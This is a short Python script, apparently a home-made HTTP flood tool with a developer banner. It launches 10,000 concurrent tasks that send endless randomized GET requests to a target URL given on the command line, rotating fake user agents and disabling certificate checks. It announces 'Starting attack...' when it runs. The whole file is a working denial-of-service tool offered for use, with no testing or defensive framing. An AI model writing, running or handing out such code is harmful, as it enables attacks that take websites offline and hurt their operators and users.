#!/usr/bin/env python3
# Developer: Safwan Al-Sadaf

import asyncio
import random
import ssl
import sys
from aiohttp import ClientSession, TCPConnector
from urllib.parse import urlparse, quote
from fake_useragent import UserAgent

# ========== Banner ==========
print(r"""
____         __                       
/ ___|  __ _ / _|_      ____ _ _ __   
\___ \ / _` | |_\ \ /\ / / _` | '_ \  
 ___) | (_| |  _|\ V  V / (_| | | | | 
|____/ \__,_|_|   \_/\_/ \__,_|_| |_|   
         Dev: Safwan Al-Sadaf
""")

# ========== Config ==========
if len(sys.argv) != 3:
    print(f"[!] Usage: python {sys.argv[0]} <target_url> <port>")
    sys.exit(1)

target = sys.argv[1]
port = sys.argv[2]
threads = 10000
delay = 0
method = "GET"
ua = UserAgent()

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

async def send_request(session, url):
    while True:
        try:
            async with session.get(f"{url}?{quote(str(random.random()))}") as response:
                await response.read()
        except:
            pass
        await asyncio.sleep(delay)

async def start_attack():
    connector = TCPConnector(ssl=ssl_ctx)
    headers = {
        'User-Agent': ua.random,
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

    async with ClientSession(connector=connector, headers=headers) as session:
        tasks = [send_request(session, target) for _ in range(threads)]
        await asyncio.gather(*tasks)

try:
    print(f"[+] Target: {target}")
    print(f"[+] Port: {port}")
    print(f"[+] Method: {method}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Starting attack...")
    asyncio.run(start_attack())
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user")
